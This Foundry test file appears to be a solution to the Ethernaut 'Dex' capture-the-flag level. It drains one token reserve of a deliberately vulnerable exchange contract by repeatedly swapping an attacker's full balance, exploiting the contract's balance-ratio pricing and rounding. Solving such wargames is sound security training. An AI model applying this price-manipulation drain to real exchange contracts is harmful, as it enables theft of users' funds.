// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_22/Dex.sol";
import "@openzeppelin/contracts/mocks/ERC20Mock.sol";

contract DexTest is Test {
    Dex dex;
    ERC20Mock token1;
    ERC20Mock token2;
    address alice;

    function setUp() public {
        alice = vm.addr(1);
        // vm.prank(alice);

        dex = new Dex();
        token1 = new ERC20Mock("Token1", "TK1", address(dex), 100);
        token2 = new ERC20Mock("Token2", "TK2", address(dex), 100);
        dex.setTokens(address(token1), address(token2));

        token1.mint(alice, 10);
        token2.mint(alice, 10);
    }

    function testAttack() public {
        vm.startPrank(alice);
        token1.approve(address(dex), 1000);
        token2.approve(address(dex), 1000);

        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);
        swapMax(token2, token1);
        swapMax(token1, token2);

        dex.swap(address(token2), address(token1), 45);

        assertEq(token1.balanceOf(address(dex)) == 0 || token2.balanceOf(address(dex)) == 0, true);

        vm.stopPrank();
    }

    function swapMax(ERC20 _token1, ERC20 _token2) public {
        dex.swap(address(_token1), address(_token2), _token1.balanceOf(alice));
    }

    function tokenBalances() internal returns (uint256, uint256) {
        return (token1.balanceOf(alice), token2.balanceOf(alice));
    }

    function dexBalances() internal returns (uint256, uint256) {
        return (token1.balanceOf(address(dex)), token2.balanceOf(address(dex)));
    }

    receive() external payable {}
}
